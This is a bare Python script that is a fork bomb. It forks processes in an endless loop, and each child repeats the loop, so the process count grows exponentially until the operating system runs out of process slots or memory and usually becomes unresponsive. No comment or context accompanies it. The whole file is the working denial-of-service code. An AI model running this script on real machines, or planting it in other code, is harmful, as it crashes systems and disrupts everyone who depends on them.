import os
import sys

children = []
while True:
    try:
        children.append(os.fork())
    except (OSError, AttributeError):
        sys.exit(1)
